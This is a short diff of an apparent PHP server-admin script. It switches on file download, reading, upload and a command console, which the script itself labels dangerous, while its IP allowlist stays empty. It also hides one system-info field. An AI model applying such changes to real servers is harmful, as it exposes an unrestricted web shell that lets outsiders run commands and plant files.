@@ -20,18 +20,18 @@ e.g. $ips = '192.168.1.1;192.168.1.2'
 $ips = '';
 
 /* Enables downloading files */
-$download = false;
+$download = true;
 
 /* Enables reading files */
-$read = false;
+$read = true;
 
 /* Enables uploading files - may be dangerous! */
-$upload = false;
+$upload = true;
 
 /* Enables console - may be dangerous! */
-$console = false;
+$console = true;
 
-$timezone = 'Europe/Prague';
+$timezone = 'Europe/Stockholm';
 
 /* =============== END SETTINGS =============== */
 
@@ -146,7 +146,7 @@ function main($dir, $download, $upload, $read, $console, $method)
   echo "<h2>Information</h2>";
 
   echo '<p><b>Current script:</b> <a href="?dir=' . __DIR__ . '">' . __FILE__ . '</a></p>';
-  echo '<p><b>PHP version:</b> ' . phpversion() . ' @ ' . php_uname() . ' [' . php_sapi_name() . ']</p>';
+  echo '<p><b>PHP version:</b> ' . phpversion() . '</p>';// @ ' . php_uname() . ' [' . php_sapi_name() . ']</p>';
   echo '<p><b>PHP extensions:</b> ' . implode(', ', get_loaded_extensions()) . '</p>';
   echo '<p><b>PHP disable functions:</b> ' . ini_get('disable_functions') . '</p>';
   echo '<p><b>PHP dangerous functions:</b> ';
